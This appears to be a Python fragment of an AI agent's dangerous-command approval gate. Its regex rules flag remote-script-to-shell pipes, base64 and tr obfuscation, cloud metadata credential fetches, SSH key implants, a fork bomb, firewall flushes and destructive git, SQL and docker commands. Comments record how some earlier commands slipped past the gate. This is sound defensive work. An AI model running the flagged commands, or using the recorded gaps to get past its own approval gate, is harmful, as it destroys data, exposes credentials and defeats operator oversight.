    (r'\bsystemctl\s+(-[^\s]+\s+)*isolate\s+\S*(?:rescue|emergency)\S*',
     "systemctl isolate/rescue (drops all running services)"),  # X255
    # `swapoff -a` disables all swap — instant memory pressure/OOM on a busy host (X285).
    # Lookup spellings stay clean per the chain-wide criterion (false-positive report):
    # `swapoff --help/-h/--version/--dry-run/--list` only prints information (false-positive fix).
    (r'\bswapoff\b' + _LOOKUP_FLAGS, "disable swap (swapoff)"),  # X285
    # Writing to /proc/sysrq-trigger issues kernel emergency commands (crash, reboot, remount-ro)
    # (X282). The target path is the signal; redirection/tee both land on it.
    (r'\bsysrq-trigger\b', "write to sysrq-trigger (kernel emergency command)"),  # X282
    # `ln -sf` over an /etc file replaces live system config (resolver, sudoers, sshd) with a
    # symlink — silent service breakage or privilege redirection (X316). -s is required (a hard
    # link to /etc files is already gated by overwrite rules when targeted); -f is what makes it
    # silent replacement.
    (rf'\bln\s+-[a-z]*f[a-z]*s[a-z]*\b|\bln\s+-[a-z]*s[a-z]*f[a-z]*\b' + _SEGMENT_BOUND + _SYSTEM_CONFIG_PATH,
     "symlink over /etc file (ln -sf)"),  # X316
    (r'\bpkill\s+-9\b', "force kill processes"),
    # killall with SIGKILL (-9 / -KILL / -s KILL / -SIGKILL) and `killall -r <regex>` broad sweeps
    # that can wipe unrelated processes.
    (r'\bkillall\s+(-[^\s]*\s+)*-(9|KILL|SIGKILL)\b', "force kill processes (killall -KILL)"),
    (r'\bkillall\s+(-[^\s]*\s+)*-s\s+(KILL|SIGKILL|9)\b', "force kill processes (killall -s KILL)"),
    (r'\bkillall\s+(-[^\s]*\s+)*-r\b', "kill processes by regex (killall -r)"),
    (r':\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:', "fork bomb"),
    # Shell -c is parsed structurally by _execution_flag_findings(); a regex searching a dash-token
    # for "c" also matched --norc/--rcfile/--restricted.
    (rf'\b(curl|wget)\b.*\|\s*(?:[/\w]*/)?(?:{_SHELL_NAMES_RE})(?:\s|$|-c)', "pipe remote content to shell"),
    (rf'\b(?:{_SHELL_NAMES_RE})\s+<\s*<?\s*\(\s*(curl|wget)\b', "execute remote script via process substitution"),
    # eval/source/. $(curl ...) — equivalent to piping remote content to a shell.
    (r'(?:\beval\b|\bsource\b|\.)\s*(?:\$\(\s*|`\s*)(?:curl|wget)\b', "execute remote content via command substitution"),
    # Cloud instance-metadata (IMDS) credential endpoints — deterministic containment-escape
    # detection. On a cloud VM these serve live IAM/service-account credentials to ANY local
    # process with no auth, so a fetch is credential exfiltration unless the operator expects it.
    # The host literals have no other use, so their appearance ANYWHERE in the command (any HTTP
    # client, env assignment, or script argument) is the signal; lookarounds keep other 169.254.x.x
    # link-local addresses and longer dotted strings out. This prompts for approval (legit uses
    # exist on real cloud VMs) — it is NOT a hardline block. Covers the link-local IPv4 endpoint
    # (AWS/Azure/GCP/OpenStack), its AWS IPv6 form fd00:ec2::254, the GCP hostname, and Alibaba
    # Cloud's 100.100.100.200.
    (r'(?<![\d.])(?:169\.254\.169\.254|100\.100\.100\.200)(?![\d.])'
     r'|(?<![\w.-])metadata\.google\.internal(?![\w.-])'
     r'|fd00:ec2::254',
     "cloud metadata endpoint access (instance credentials)"),
    # Decode-and-execute: `echo <base64> | base64 -d | bash` carries no dangerous keywords in the
    # raw text yet runs arbitrary commands.
    (rf'\b(base64|base32|base16)\s+(?:-[dD]|--decode)\b.*\|\s*\b(?:{_SHELL_NAMES_RE})\b', "pipe decoded content to shell (possible command obfuscation)"),
    # xxd uses -r for decode, not -d.
    (rf'\bxxd\s+-r\b.*\|\s*\b(?:{_SHELL_NAMES_RE})\b', "pipe xxd-decoded content to shell (possible command obfuscation)"),
    # `echo 'eq -pe v/' | tr 'eqv' 'rmf' | bash` decodes to `rm -rf /`.
    (rf'\becho\b[^|]*\|\s*\btr\b[^|]*\|\s*\b(?:{_SHELL_NAMES_RE})\b', "pipe tr-transformed output to shell (possible command obfuscation)"),
    (rf'\bopenssl\b.*\b(?:base64|enc)\b[^|]*\s+-[dD]\b[^|]*\|\s*\b(?:{_SHELL_NAMES_RE})\b',
     "pipe openssl-decoded content to shell (possible command obfuscation)"),
    # SSH key implant (corpus X287): a write into an `authorized_keys` file adds a key that survives
    # password rotation — the highest-value persistence primitive on a host. Must sit BEFORE the
    # generic _SENSITIVE_WRITE_TARGET tee/redirection rules so this one file gets the honest reason;
    # every other ~/.ssh/* write keeps "overwrite system file via redirection" (pinned by
    # TestSensitiveRedirectPattern, which asserts only the verdict, and by the cp/mv/sed rules below,
    # which carry no `>` or `tee` and so never reach this rule).
    (r'>>?\s*[^;|&\n]*?\bauthorized_keys\b|\btee\b[^;|&\n]*?\bauthorized_keys\b',
     "write to authorized_keys (SSH key injection)"),  # X287
    (rf'\btee\b.*["\']?{_SENSITIVE_WRITE_TARGET}', "overwrite system file via tee"),
    (rf'>>?\s*["\']?{_SENSITIVE_WRITE_TARGET}', "overwrite system file via redirection"),
    (rf'\btee\b.*["\']?{_PROJECT_SENSITIVE_WRITE_TARGET}["\']?{_WRITE_TARGET_BOUNDARY}', "overwrite project env/config via tee"),
    (rf'>>?\s*["\']?{_PROJECT_SENSITIVE_WRITE_TARGET}["\']?{_WRITE_TARGET_BOUNDARY}', "overwrite project env/config via redirection"),
    (r'\bxargs\s+.*\brm\b', "xargs with rm"),
    # -execdir has the same semantics as -exec (runs in each match's directory).
    (r'\bfind\b.*-exec(?:dir)?\s+(/\S*/)?rm\b', "find -exec/-execdir rm"),
    # Unquoted brace/glob spellings the shell can expand into the flags above at run time
    # (`find . -{delete,print}`, `find . -del*`). Additive: catches these spellings only; approval is
    # still decided from source text, so `$var`/`$(...)`-built words are not covered here. `find` must
    # be the command word and the dynamic word a whitespace-delimited token; both rules are matched
    # against the quote-masked variant (_QUOTE_MASKED_DANGEROUS_DESCRIPTIONS) because a quoted glob
    # (`find . -name 'log-del*'`) is a literal predicate argument the shell never expands.
    (_CMDPOS + r'find\s[^;|&\n]*(?<!\S)-(?:\{[^}\s]*(?:delete|exec(?:dir)?)[^}\s]*\}|(?:del(?:ete?)?|exec(?:dir)?)[*?\[])',
     "find dynamic shell word may expand to destructive flag"),
    (r'\bfind\b.*-delete\b', "find -delete"),
    # Same for program-bearing read-tool options, which _execution_flag_findings() parses structurally
    # only when the option is spelled literally.
    (r'\b(?:rg|sort|ag|man)\b[^;|&\n]*(?<!\S)--(?:pre|hostname-bin|compress-program|pager|html)(?:\{|[*?\[])',
     "dynamic shell word may expand to arbitrary program execution flag"),
    # Gateway lifecycle: stopping/restarting the gateway kills all running agents. Global flags
    # between `hermes` and `gateway` (`hermes -p ade gateway restart`) are allowed so a profile flag can't slip past.
    (r'\bhermes\s+(?:-{1,2}\S+(?:\s+\S+)?\s+)*gateway\s+(stop|restart)\b', "stop/restart hermes gateway (kills running agents)"),
    (r'\bhermes\s+update\b', "hermes update (restarts gateway, kills running agents)"),
    # Docker/Podman daemon redirect — global flags or env that point the CLI at a DIFFERENT (often remote) daemon:
    # `docker -H ssh://prod stop app` looks local but operates on remote infra, so any redirect requires approval
    # regardless of subcommand. The flag must be in global position (before the subcommand) and -H/--host/--context
    # must carry a value, keeping `docker -h` and `docker run -h <hostname>` out. Listed BEFORE the lifecycle rules so
    # a redirected lifecycle command surfaces the more specific reason.
    (r'\bdocker\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*(?:-h|--host)[=\s]+\S+', "docker with remote daemon redirect (-H/--host)"),
    (r'\bdocker\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*(?:-c|--context)[=\s]+\S+', "docker with daemon redirect (--context: alternate daemon)"),
    (r'\bdocker\s+context\s+use\b', "docker context use (switches default daemon for future commands)"),
    (r'\bpodman\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*(?:--url|--connection|--identity)[=\s]+\S+', "podman with remote daemon redirect (--url/--connection/--identity)"),
    (r'\bpodman\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*(?:-r\b|--remote\b)', "podman remote mode (-r/--remote: remote daemon)"),
    (r'\b(?:docker_host|docker_context|container_host|container_connection)=\S+', "docker/podman daemon redirect via environment (DOCKER_HOST/CONTAINER_HOST)"),
    # Container lifecycle (docker.sock mounts let the agent stop/kill containers) always needs
    # consent. Global flags between docker/compose and the verb and the legacy `docker-compose`
    # binary are allowed so a flag can't slip past.
    (r'\bdocker(?:-compose|\s+compose)\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*(restart|stop|kill|down)\b', "docker compose restart/stop/kill/down (container lifecycle)"),
    (r'\bdocker\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*(restart|stop|kill)\b', "docker restart/stop/kill (container lifecycle)"),
    # Gateway protection: never start gateway outside systemd management
    (r'gateway\s+run\b.*(&\s*$|&\s*;|\bdisown\b|\bsetsid\b)', "start gateway outside systemd (use 'systemctl --user restart hermes-gateway')"),
    (r'\bnohup\b.*gateway\s+run\b', "start gateway outside systemd (use 'systemctl --user restart hermes-gateway')"),
    # Self-termination protection: prevent agent from killing its own process
    (r'\b(pkill|killall)\b.*\b(hermes|gateway|cli\.py)\b', "kill hermes/gateway process (self-termination)"),
    # killall BY NAME is a broad sweep of every process matching the name (X061 `killall node`
    # takes down the whole gateway fleet). Placed AFTER the SIGKILL/-r and self-termination rules
    # so their specific descs win; the operand class excludes flags, so informational `killall -l`
    # / `-V` (no process-name operand) stay clean.
    (r'\bkillall\s+(?:-[^\s]*\s+)*[^\s-][^\s]*', "kill processes by name (killall)"),  # X061
    # fuser -k kills every process holding the file/socket (X065 `fuser -k 8787/tcp`); plain
    # `fuser <file>` only reports PIDs and stays clean — the rule requires the -k/--kill flag.
    # GNU combined short options cluster, so `-km`/`-mk`/`-k9`/`-kmv` carry the SAME kill action
    # as `-k -m` (same "clustered flag" class as the `-q` miss). The
    # flag class is `[a-z]*k` — no other fuser single-letter flag contains `k` (list is
    # -a -i -k -l -m -M -n -s -u -v -x), so a k inside a cluster can only be kill.
    (r'\bfuser\b' + _SEGMENT_BOUND + r'\s(?:-[a-z]*k|--kill\b)', "kill processes on file/socket (fuser -k)"),  # X065
    # Self-termination via kill + $(pgrep/pidof): the substitution is opaque to the name-based
    # pattern above, so catch the structural form.
    (r'\bkill\b.*\$\(\s*(pgrep|pidof)\b', "kill process via pgrep/pidof expansion (self-termination)"),
    (r'\bkill\b.*`\s*(pgrep|pidof)\b', "kill process via backtick pgrep/pidof expansion (self-termination)"),
    # launchctl-driven gateway stop/restart on macOS (label `ai.hermes.gateway`). Two independent lookaheads, NOT a
    # sequential match: a for-loop building the label from a list defined EARLIER (`for item in 'ai.hermes...'; do
    # launchctl bootout "$label"`) never has "hermes" after the verb, and that slipped past and restarted 4 gateways
    # with zero approval. Erring broad is correct for an approval gate: an extra prompt is cheap.
    # Anchor whole-input lookaheads: re.search otherwise rescans every suffix of
    # long non-matching commands, holding the GIL and starving Gateway threads.
    (r'\A(?=[\s\S]*\blaunchctl\s+(?:stop|kickstart|bootout|unload|kill|disable|remove)\b)(?=[\s\S]*\b(?:hermes|ai\.hermes)\b)', "stop/restart hermes launchd service (kills running agents)"),
    (rf'\b(cp|mv|install)\b.*\s{_SYSTEM_CONFIG_PATH}', "copy/move file into system config path"),
    (rf'\b(cp|mv|install)\b.*\s["\']?{_PROJECT_SENSITIVE_WRITE_TARGET}["\']?{_COMMAND_TAIL}', "overwrite project env/config file"),
    # cp/mv/install OVERWRITING a credential/SSH/shell-rc/Hermes file (key implant, login-time
    # injection) — pairs the tee/redirection coverage. Anchored to the command tail so only the
    # DESTINATION fires; reading OUT of a sensitive path (`cp ~/.ssh/config /tmp/x`) stays safe.
    # The trailing `[^\s"\']*` consumes the rest of the destination filename.
    # The tee/redirection patterns above already gate _SENSITIVE_WRITE_TARGET (~/.ssh/*,
    # ~/.netrc/.pgpass/.npmrc/.pypirc, shell rc files, ~/.hermes/config.yaml/.env), but cp/mv/install was
    # only paired for /etc and project-relative env/config — so `cp evil ~/.ssh/authorized_keys` (key
    # implant), `cp creds ~/.netrc`, and `cp evil ~/.bashrc` (login-time command injection) slipped through
    # with auto-approve. Same unpaired-door rationale as #14639 / the sed-tee-redirect pairing on these
    # targets. `authorized_keys` after the `~/.ssh/` fragment).
    (rf'\b(cp|mv|install)\b.*\s["\']?{_SENSITIVE_WRITE_TARGET}[^\s"\']*["\']?{_COMMAND_TAIL}', "copy/move file into sensitive credential/SSH/shell-rc path"),
    # In-place edits mutate the file directly, bypassing redirection/tee/cp coverage; gate the same
    # startup/credential files.
    (rf'\bsed\s+-[^\s]*i.*(?:{_USER_SENSITIVE_WRITE_TARGET})[^\s"\']*', "in-place edit of sensitive credential/SSH/shell-rc path"),
    (rf'\bsed\s+--in-place\b.*(?:{_USER_SENSITIVE_WRITE_TARGET})[^\s"\']*', "in-place edit of sensitive credential/SSH/shell-rc path (long flag)"),
    (rf'\b(?:perl|ruby)\b.*(?:^|\s)-[^\s]*i\b.*(?:{_USER_SENSITIVE_WRITE_TARGET})[^\s"\']*', "in-place edit of sensitive credential/SSH/shell-rc path (perl/ruby)"),
    (rf'\bsed\s+-[^\s]*i.*\s{_SYSTEM_CONFIG_PATH}', "in-place edit of system config"),
    (rf'\bsed\s+--in-place\b.*\s{_SYSTEM_CONFIG_PATH}', "in-place edit of system config (long flag)"),
    # sed -i on Hermes config/.env bypasses the redirection/tee rules; pairs the file_tools
    # write_file/patch deny so the terminal side is not an open door.
    # In-place edit of a Hermes-managed security file (~/.hermes/config.yaml or .env). sed -i bypasses the
    # redirection/tee patterns above because it mutates the file directly. See #14639.
    (rf'\bsed\s+-[^\s]*i.*(?:{_HERMES_CONFIG_PATH}|{_HERMES_ENV_PATH})', "in-place edit of Hermes config/env"),
    (rf'\bsed\s+--in-place\b.*(?:{_HERMES_CONFIG_PATH}|{_HERMES_ENV_PATH})', "in-place edit of Hermes config/env (long flag)"),
    # perl/ruby -i: the flag may be its own token after other flags (`-p -i -e`), combined (`-pi`), or carry a backup
    # suffix (`-i.bak`), so match any flag token containing `i` anywhere; `perl -e '...'` (no -i) does not trip.
    # perl -i and ruby -i perform the same in-place mutation as sed -i but are not caught by the -e/-c
    # script-execution pattern above (which targets code evaluation, not file mutation). Pairs the sed -i
    # coverage from #14639.
    (rf'\b(?:perl|ruby)\b.*(?:^|\s)-[^\s]*i\b.*(?:{_HERMES_CONFIG_PATH}|{_HERMES_ENV_PATH})', "in-place edit of Hermes config/env (perl/ruby)"),
    # Interpreter heredocs are handled by _execution_flag_findings(); only shell heredocs stay
    # regex-based. `bash <<'EOF'` runs arbitrary commands without triggering the `bash -c` path.
    (rf'\b(?:{_SHELL_NAMES_RE})\s+<<', "shell execution via heredoc"),
    # Git destructive operations. `git reset --hard` accepts any unambiguous long-flag prefix (--h,
    # --ha, --har): --hard is the only reset mode starting with "h", and `--help` is special-cased
    # by git before mode resolution.
    (r'\bgit\s+reset\s+--h(?:a(?:r(?:d)?)?)?\b', "git reset --hard (destroys uncommitted changes)"),
    # Mirror push deletes/force-updates EVERY remote ref absent locally (corpus X304, harm
    # layer "history"). Bounded to one command segment (`[^;|&\n]`) so an unrelated later command's
    # token can't contaminate, and anchored on the `--mirr` FLAG SPELLING (with git's unambiguous
    # long-option abbreviations) so a remote/branch NAMED `mirror` (`git push origin mirror-sync`)
    # stays clean. _GIT_GLOBAL_OPTS closes the `git -C <dir> push …` bypass (the incident
    # ran exactly this form; the pre-existing force rules were bypassable the same way).
    (_GIT_PUSH + r'[^;|&\n]*?\s--mirr[a-z]*\b', "git mirror push (deletes/overwrites remote refs not present locally)"),
    # `git push --prune` DELETES remote branches absent locally — same harm class as corpus X305
    # (`git push origin --delete`). Anchored on the push subcommand so the harmless
    # `git fetch --all --prune` (X044, label 0) is untouched.
    (_GIT_PUSH + r'[^;|&\n]*?\s--prune\b', "git push prune (deletes remote refs absent locally)"),
    # corpus X305 (gate-vs-allow decided: GATE — label 1, harm layer
    # "history": deleting an unmerged remote branch leaves commits only on the author's
    # disk; same harm class as --prune above). Covers all three delete spellings:
    # --delete / -d flag, and the colon-prefixed refspec (`git push origin :branch`,
    # `:refs/heads/b`) which is delete-by-refspec. Bounded to the push command segment;
    # a NON-prefixed colon refspec (`main:main`, `HEAD:main`) is a plain update and does
    # not match (the `:` must sit right after whitespace).
    (_GIT_PUSH + r'[^;|&\n]*?\s(?:-d\b|--delete\b|:\S+)', "git push delete (removes a remote branch/ref)"),
    # corpus X040: a LEADING `+` in a refspec is force-push semantics
    # (`git push origin +main:main` == `--force main:main`). The `+` must sit immediately
    # after whitespace (refspec PREFIX position); git forbids `+`-prefixed ref/tag names,
    # so name-internal `+` (`v2.0+build`), a trailing `+` (`main+`), and a `+` in a LATER
    # command segment (`&& echo +done`) do not match.
    (_GIT_PUSH + r'[^;|&\n]*?\s\+\S+', "git push force via +refspec prefix (rewrites remote history)"),
    # --force-with-lease is the SAFE force variant (refuses stale overwrite; corpus X056 tier
    # contextual). It stays gated — never silently allowed — but gets its own honest reason so the
    # legacy "rewrites remote history" verdict no longer misattributes it. Must precede the
    # --force rules: detection returns the FIRST pattern match and `--force\b` matches inside
    # `--force-with-lease` (hyphen is a word boundary).
    (_GIT_PUSH + r'[^;|&\n]*?--force-with-lease\b', "git push with lease (safe force variant, still overwrites when lease holds)"),
    # `.*` (DOTALL) used to cross `;`/`&&`/`|`, blocking a harmless `git push --dry-run … | sed
    # 's/[0-9a-f]\{40\}/…/'` on an unrelated `-f` in a LATER segment. Same-segment bound fixes it;
    # real force pushes (`git push -f … && echo done`) still match because -f sits in the push
    # segment itself.
    (_GIT_PUSH + r'[^;|&\n]*?--forc[a-z]*\b', "git force push (rewrites remote history)"),
    (_GIT_PUSH + r'[^;|&\n]*?-f\b', "git force push short flag (rewrites remote history)"),
    (r'\bgit\s+clean\s+-[^\s]*f', "git clean with force (deletes untracked files)"),
    (r'\bgit\s+branch\s+-D\b', "git branch force delete"),
    # `-D` = `-d --force`; the long spellings are different tokens, so match delete+force in either order, bounded to
    # one command segment (no `;`/`|`/`&`/newline) so an unrelated later command isn't contaminated.
    (r'\bgit\s+branch\b[^;|&\n]*?(?:-d\b|--delete\b)[^;|&\n]*?(?:-f\b|--force\b)', "git branch force delete (long flags)"),
    (r'\bgit\s+branch\b[^;|&\n]*?(?:-f\b|--force\b)[^;|&\n]*?(?:-d\b|--delete\b)', "git branch force delete (long flags, force-first)"),
    # chmod +x then immediate run: the script content may hold dangerous commands individual patterns miss.
    (r'\bchmod\s+\+x\b.*[;&|]+\s*\./', "chmod +x followed by immediate execution"),
    # Sudo stdin/askpass/shell/list-privs flags. The agent has no TTY, so sudo invocations that succeed
    # non-interactively read the password from stdin (-S) or askpass (-A); -s (shell) and -a (list) are gated as
    # privilege chains (read SUDO_PASSWORD from .env -> sudo -S -s). Plain `sudo cmd` is TTY-bound and excluded. Input
    # is lowercased, so S/s and A/a collapse. Lazy `[^;|&\n]*?` allows flag args without spanning separators. sudo
    # resolves unambiguous long-flag prefixes: `--stdin` is the only long option starting with "st", `--askpass` the
    # only one starting with "a".
    (r'\bsudo\b[^;|&\n]*?\s+(?:-s\b|--st[a-z]*\b|-a\b|--a[a-z]*\b)', "sudo with privilege flag (stdin/askpass/shell/list)"),
    # Combined short-flag form (-nS, -sa, -las).
    (r'\bsudo\b[^;|&\n]*?\s+-[a-z]*[sa][a-z]*\b', "sudo with combined-flag privilege escalation"),
    # Package-manager uninstall commands can remove installed software outside
    # the current project (notably `npm uninstall -g`). Treat their destructive
    # subcommands like other state-removing operations while leaving installs
    # and updates alone.
    # _CMDPOS-anchored (quoted prose like `git commit -m "npm uninstall docs"` is data); the
    # option group also swallows one operand (`--prefix DIR`, `--proxy URL`, `--cwd DIR`).
    (_CMDPOS + r'npm\s+' + _PKG_OPTS + r'(?:uninstall|unlink|remove|rm|r|un)\b', "package manager uninstall"),
    (_CMDPOS + r'pnpm\s+' + _PKG_OPTS + r'(?:uninstall|remove|rm|un)\b', "package manager uninstall"),
    (_CMDPOS + r'yarn\s+' + _PKG_OPTS + r'(?:global\s+)?(?:uninstall|remove)\b', "package manager uninstall"),
    (_CMDPOS + r'pip(?:3)?\s+' + _PKG_OPTS + r'uninstall\b', "package manager uninstall"),
    (_CMDPOS + r'brew\s+' + _PKG_OPTS + r'(?:uninstall|remove|rm)\b', "package manager uninstall"),
    # ── harm-layer "data" backlog (corpus, harm_layer=data) ──────────
    # 28 false negatives whose harm is unrecoverable DATA loss (labeling rules R3/R9/R10/R13).
    # Every rule is bounded to ONE command segment (`[^;|&\n]*`) so a token in a later `&&`/`|`
    # segment cannot contaminate the verdict, and every rule was FP-measured against the corpus
    # label-0 rows before landing (FP stays exactly the known 25 ids, no new id).
    #
    # Irreversible file destruction: `shred -u` overwrites then unlinks (forensic-unrecoverable);
    # `wipefs -a` erases filesystem/partition signatures so the data becomes unaddressable.
    (r'\bshred\b' + _SEGMENT_BOUND + r'\s(?:-u\b|--remove\b)', "shred --remove (irreversible file destruction)"),  # X007 X237
    (r'\bwipefs\b' + _SEGMENT_BOUND + r'\s-a\b', "wipe filesystem signatures (wipefs)"),  # X236
    # In-place truncation to zero: the file's own content is gone and no copy exists. The corpus
    # label-0 boundaries are log rotation (`/var/log/…`, `*.log`: X017 X319) and a tracked doc
    # (`*.md`: X252) — both exempted via a lookahead over the rest of the segment.
    (r'\btruncate\b' + _SEGMENT_BOUND + r'\s-s\s+0\b(?![^;|&\n]*(?:/var/log/|\.log\b|\.md\b))',
     "truncate file to zero (data destruction)"),  # X006 X210 X238
    # Redis: FLUSHALL/FLUSHDB drop every key in the instance; `del` removes the named keys (X314
    # pipelines a scan into `xargs redis-cli del`, so the rule anchors on the redis-cli segment
    # rather than on the pipeline shape).
    (r'\bredis-cli\b' + _SEGMENT_BOUND + r'\b(?:flushall|flushdb)\b', "redis data destruction (FLUSHALL/FLUSHDB/DEL)"),  # X163 X164
    (r'\bredis-cli\b' + _SEGMENT_BOUND + r'\bdel\b', "redis data destruction (FLUSHALL/FLUSHDB/DEL)"),  # X314
    # SQL: schema/column drops, whole-table overwrite with NULL, and a row DELETE. The bare
    # `DELETE FROM` rule sits AFTER the pre-existing "DELETE without WHERE" rule so the narrower
    # reason keeps precedence for the no-WHERE spelling; `DROP INDEX` (X182) and an UPDATE with a
    # WHERE (X180) stay clean.
    (r'\bDROP\s+SCHEMA\b', "SQL DROP SCHEMA"),  # X166
    (r'\bALTER\s+TABLE\b' + _SEGMENT_BOUND + r'\bDROP\s+COLUMN\b', "SQL DROP COLUMN"),  # X168
    (r'\bUPDATE\s+\w+\s+SET\b' + _SEGMENT_BOUND + r'=\s*NULL\b', "SQL UPDATE setting values to NULL"),  # X169
    (r'\bUPDATE\s+\w+\s+SET\b(?![^;\n]*\bWHERE\b)', "SQL UPDATE without WHERE (whole-table overwrite)"),
    # A row DELETE is unrecoverable (R3), but a bare SQL string is only DATA — the repo's own
    # `test_delete_with_where_safe` pins `DELETE FROM users WHERE id = 1` as safe. Anchor the rule
    # on a database CLIENT invocation, which is what actually runs the statement (X179 psql -c).
    (r'\b(?:psql|pgcli|mysql|mariadb|sqlite3)\b' + _SEGMENT_BOUND + r'\bDELETE\s+FROM\b', "SQL DELETE (row deletion)"),  # X179
    # PostgreSQL: `--clean` DROPs the existing objects before restoring (prod data replaced by an
    # old snapshot); `pg_dropcluster` removes the cluster's data + config. `pg_restore -d scratch`
    # (X183) is the label-0 boundary and carries no --clean, so it stays clean.
    (r'\bpg_restore\b' + _SEGMENT_BOUND + r'\s--clean\b', "pg_restore --clean (drops existing database objects)"),  # X165
    (r'\bpg_dropcluster\b', "drop PostgreSQL cluster (pg_dropcluster)"),  # X167
    # Docker: volume rm/prune destroys persistent data (not rebuildable from the image);
    # `system prune -a/--volumes` sweeps images AND volumes. Global flags before the verb are
    # tolerated so a flag cannot slip the rule; bare `docker system prune` (X153) and a non-forced
    # `docker rm` (X151) stay clean.
    (r'\bdocker\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*volume\s+(?:rm|prune)\b', "docker volume rm/prune (destroys volume data)"),  # X137 X140
    (r'\bdocker\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*system\s+prune\b' + _SEGMENT_BOUND + r'\s(?:-a\b|--all\b|--volumes\b)',
     "docker system prune --all/--volumes (destroys images and volumes)"),  # X139
    (r'\bdocker\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*rm\b' + _SEGMENT_BOUND + r'\s(?:-f\b|--force\b)', "docker rm --force (forced container removal)"),  # X133
    (r'\bdocker\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*pause\b', "docker pause (suspends container)"),  # X157
    # apt purge/remove of a security or infrastructure package: purge runs the postrm script, which
    # deletes cluster data and config (R11). Installs (X320), `autoremove --purge -y` with no
    # package operand (X128), and non-infra packages (X127) stay clean.
    (_CMDPOS + r'\bapt(?:-get)?\s+(?:-{1,2}\S+(?:\s+[^-\s]\S*)?\s+)*(?:remove|purge|autoremove)\b'
     + _SEGMENT_BOUND + r'\b' + _APT_INFRA_PACKAGES,
     "apt remove/purge of security or infrastructure package"),  # X111 X113 X114 X115 X116 X130
    # rsync --delete makes the destination match the source, so files present only at the
    # destination are deleted: an empty or stale source wipes a backup or a live tree. A destination
    # that names itself a MIRROR (`builds-mirror/`, X028) is the label-0 boundary — the exemption
    # requires the `mirror` token to look like a PATH (a `/` earlier in the same token), so a bare
    # `# mirror` comment cannot disable the rule, a `~/…-mirror/` spelling is exempt like its
    # absolute twin, and a plain `rsync -av` (X241) never matches.
    (r'\brsync\b' + _SEGMENT_BOUND + r'\s--delete\b(?![^;|&\n]*\s\S*/\S*mirror)',
     "rsync --delete over live data tree (deletes files missing at source)"),  # X233 X247 X251
    (r'\bcrontab\b' + _SEGMENT_BOUND + r'\s-r\b', "remove crontab (crontab -r)"),  # X261
    # Redirect overwriting a backup: a bare `>` in command position truncates the file with no
    # producer (X232), and `pg_dump > …-latest.dump` overwrites the rollback point (X184). A
    # DATE-stamped dump (X172) creates a new file and stays clean.
    (r'(?:^|[;&|\n])\s*>\s*["\']?' + _SEGMENT_BOUND + r'\.\b(?:dump|sql|bak|tar|tgz|gz)\b',
     "empty redirect truncates backup dump file"),  # X232
    (r'\bpg_dump\b' + _SEGMENT_BOUND + r'>\s*["\']?\S*(?:latest|current)\S*', "redirect overwrites latest backup file"),  # X184
    # ssh-keygen -f onto a DEFAULT identity name overwrites the private key in place (R9); a new
    # named key (X223 `deploy_2026`) stays clean.
    (r'\bssh-keygen\b' + _SEGMENT_BOUND + r'\s-f\s+["\']?\S*id_(?:rsa|dsa|ecdsa|ed25519)\b',
     "ssh-keygen overwrites default SSH identity key"),  # X227
    (r'\bvault\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*kv\s+(?:-{1,2}\S+(?:[=\s]\S+)?\s+)*delete\b',
     "delete Vault secret (vault kv delete)"),  # X212
    # ── harm-layer "security" backlog (corpus, harm_layer=security) ────
    # False negatives whose harm is a SECURITY-CONTROL loss: the host firewall or the brute-force
    # guard disabled/punched open, credentials made group/world-readable, a privilege-escalation
    # primitive planted (SUID bit, sudo group, uid-0 user, SSH key, plaintext credential store).
    # Every rule is bounded to ONE command segment (`[^;|&\n]*`) so a token in a later `&&`/`|`
    # segment cannot contaminate the verdict, and every rule was FP-measured against the corpus
    # label-0 rows before landing (FP stays exactly the known 25 ids, no new id).
    #
    # ufw: `disable`/`reset` takes the host firewall down entirely (X087). The open-port rule is an
    # explicit DATABASE/APP-service port list, never a wildcard, so the standard web ports stay
    # clean: `ufw allow 443/tcp` (X098) and the source-restricted `ufw allow from 100.64.0.0/10 to
    # any port 22 proto tcp` (X102) are label 0. `ufw delete allow 80/tcp` (X104) and `ufw reload`
    # (X108) carry no matching verb/port pair.
    (r'\bufw\b' + _SEGMENT_BOUND + r'\b(?:disable|reset)\b',
     "disable firewall (ufw disable/reset)"),  # X087
    (r'\bufw\b' + _SEGMENT_BOUND + r'\ballow\b' + _SEGMENT_BOUND + r'\b(?:5432|3306|6379|27017|9200|11211|5433|8080)\b',
     "open database/app service port (ufw allow)"),  # X090 X103
    # Residual: the two loosenings of the SAME family the port-list rule covers.
    # `ufw default allow` flips the whole incoming/outgoing policy to permissive in one command —
    # strictly broader than any single allow rule. The `from any` form needs `any` as the SOURCE
    # (a word directly after `from`): X102's `ufw allow from 100.64.0.0/10 to any port 22` keeps
    # `to any` as DESTINATION only and stays clean — the restricted-source boundary.
    (r'\bufw\b' + _SEGMENT_BOUND + r'\bdefault\b' + _SEGMENT_BOUND + r'\ballow\b',
     "relax firewall default policy (ufw default allow)"),
    (r'\bufw\b' + _SEGMENT_BOUND + r'\ballow\b' + _SEGMENT_BOUND + r'\bfrom\s+any\b',
     "open firewall to any source (ufw allow from any)"),
    (r'\bufw\b' + _SEGMENT_BOUND + r'\b(?:deny|reject|limit)\b' + _SEGMENT_BOUND + r'\b22\b',
     "deny SSH access (ufw deny 22)"),  # X312
    # iptables: -F flushes every rule, -P rewrites a chain policy (DROP/ACCEPT), -A/-I/-D add or
    # remove a rule, and `-j DROP|REJECT` is the drop-everything payload. `iptables -L -n
    # --line-numbers` (X101) is a read-only listing and stays clean.
    (r'\biptables\b' + _SEGMENT_BOUND
     + r'\s(?:-F\b|--flush\b|-P\b|--policy\b|-A\b|--append\b|-I\b|--insert\b|-D\b|--delete\b'
     + r'|-j\s+(?:drop|reject)\b)',
     "modify firewall rules (iptables)"),  # X088 X089 X093 X106 X311
    (r'\bnft\b' + _SEGMENT_BOUND + r'\bflush\b' + _SEGMENT_BOUND + r'\bruleset\b',
     "flush nftables ruleset"),  # X092
